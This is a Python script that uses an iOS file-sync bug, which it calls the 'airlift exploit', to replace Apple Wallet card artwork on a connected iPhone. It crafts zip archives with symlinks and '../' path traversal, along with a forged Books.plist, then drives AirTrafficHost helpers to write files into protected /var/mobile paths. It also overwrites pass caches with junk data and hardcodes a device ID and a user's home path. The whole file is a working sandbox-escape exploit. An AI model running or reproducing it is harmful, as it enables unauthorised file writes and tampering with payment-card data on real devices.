#!/usr/bin/env python3
"""Apply custom card skins to Apple Wallet passes using airlift exploit."""

from __future__ import annotations

import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import struct
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
DEVICE_HELPER = ROOT / "bin" / "device_helper" if (ROOT / "bin" / "device_helper").is_file() else ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "bin" / "airtraffic_host" if (ROOT / "bin" / "airtraffic_host").is_file() else ROOT / "build" / "airtraffic_host"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SOURCE_PREFIX = "airlift-src-"
LINK_PREFIX = "airlift-link-"
RECOVERED_PREFIX = "airlift-recovered-"
SZ_EXTRA_ID = 0x5A53


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_archive_multi(target: str, files: list[tuple[str, bytes]]) -> bytes:
    target_tail = target.lstrip("/")
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            if not component:
                continue
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        for idx, (_leaf, payload) in enumerate(files):
            archive.writestr(zip_info(f"payload_{idx}", stat.S_IFREG | 0o600), payload)
        if files:
            archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), files[0][1])
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            val = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(val, dict):
            result = val
            break
    if result is None:
        raise RuntimeError(f"{Path(command[0]).name} failed: {completed.stderr}")
    result["exitCode"] = completed.returncode
    return result


def run_json_streaming(command: list[str], timeout: int, on_progress=None) -> dict:
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )
    result = None
    try:
        if proc.stdout:
            for line in iter(proc.stdout.readline, ""):
                line_str = line.strip()
                if not line_str:
                    continue
                try:
                    val = json.loads(line_str)
                    if isinstance(val, dict):
                        if val.get("type") == "atc_progress" and on_progress:
                            on_progress(val)
                        result = val
                except json.JSONDecodeError:
                    pass
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        raise TimeoutError(f"{Path(command[0]).name} timed out after {timeout}s")

    if result is None:
        stderr = proc.stderr.read() if proc.stderr else ""
        raise RuntimeError(f"{Path(command[0]).name} failed: {stderr}")
    result["exitCode"] = proc.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def operation_ok(result: dict) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def write_file(udid: str, target: str, leaf: str, payload: bytes, retries: int = 3) -> bool:
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            payload_identifier = f"../../{source}/payload"

            # Step 1: move link to media
            # Step 2: move new payload into link/leaf (atomically creates or overwrites target)
            identifiers = [link_identifier, payload_identifier]
            destinations = [
                link_destination,
                posixpath.join(link_destination, leaf),
            ]

            with tempfile.TemporaryDirectory(prefix="airlift-write-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(target, payload))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))
                atc = run_json(atc_cmd, timeout=120)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.3 * attempt)

    return False


def write_files_batch(
    udid: str,
    target: str,
    files: list[tuple[str, bytes]],
    retries: int = 3,
    progress_callback=None,
) -> bool:
    if not files:
        return True

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            identifiers = [link_identifier]
            destinations = [link_destination]

            for idx, (leaf, _) in enumerate(files):
                identifiers.append(f"../../{source}/payload_{idx}")
                destinations.append(posixpath.join(link_destination, leaf))

            with tempfile.TemporaryDirectory(prefix="airlift-batch-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive_multi(target, files))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))

                timeout = max(120, len(files) * 2)
                if progress_callback:
                    atc = run_json_streaming(atc_cmd, timeout=timeout, on_progress=progress_callback)
                else:
                    atc = run_json(atc_cmd, timeout=timeout)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.4 * attempt)

    return False


def invalidate_cache(udid: str, card_hash: str) -> bool:
    """Invalidates card image cache by corrupting cache leaves in .cache and .pkcache."""
    any_ok = False
    cache_leaves = [("FrontFace", b"corrupted"), ("PlaceHolder", b"corrupted"), ("Preview", b"corrupted")]
    for ext in [".cache", ".pkcache"]:
        cache_dir = f"/var/mobile/Library/Passes/Cards/{card_hash}{ext}"
        try:
            if write_files_batch(udid, cache_dir, cache_leaves):
                any_ok = True
            else:
                for leaf, payload in cache_leaves:
                    if write_file(udid, cache_dir, leaf, payload):
                        any_ok = True
        except Exception:
            pass
    return any_ok


def main():
    udid = "00008120-001A1D0A1EE9A01E"
    batter_path = Path("/Users/mak5er/Downloads/CardChanger.batter")
    if not batter_path.is_file():
        print(f"Error: {batter_path} not found")
        sys.exit(1)

    with zipfile.ZipFile(batter_path, "r") as z:
        img_data = z.read("CardChanger/container/RENAME_ME.pkpass/cardBackgroundCombined@2x.png")

    hashes = [
        "OM6NYhwXMZrAw0sRUjR62wmF4ZQ=",
        "M6nDwZrkYbFlsodLgCbvyFZQ1cc=",
        "kJL-D0rr-SZhbj2c8nK-OQ9hCMY=",
        "hwAtAmHKYwsQrJbT5cTNDsaxVME=",
    ]

    print(f"Loaded image from batter: {len(img_data)} bytes")
    print(f"Targeting {len(hashes)} cards on device {udid}...")

    for index, h in enumerate(hashes, 1):
        target_dir = f"/var/mobile/Library/Passes/Cards/{h}.pkpass"
        print(f"\n[{index}/{len(hashes)}] Processing card: {h}")

        print("  -> Writing card artwork (fast batch)...")
        card_assets = [
            ("cardBackgroundCombined@3x.png", img_data),
            ("cardBackgroundCombined@2x.png", img_data),
        ]
        ok_batch = write_files_batch(udid, target_dir, card_assets)
        if not ok_batch:
            ok3x = write_file(udid, target_dir, "cardBackgroundCombined@3x.png", img_data)
            ok2x = write_file(udid, target_dir, "cardBackgroundCombined@2x.png", img_data)
            ok_batch = ok3x and ok2x
        print(f"     Result: {'SUCCESS' if ok_batch else 'FAILED'}")

        print("  -> Invalidating pass cache...")
        ok_cache = invalidate_cache(udid, h)
        print(f"     Result: {'SUCCESS' if ok_cache else 'FAILED (or cache already empty)'}")

    print("\nAll done! Please force close Wallet on your iPhone and reopen it.")


if __name__ == "__main__":
    main()
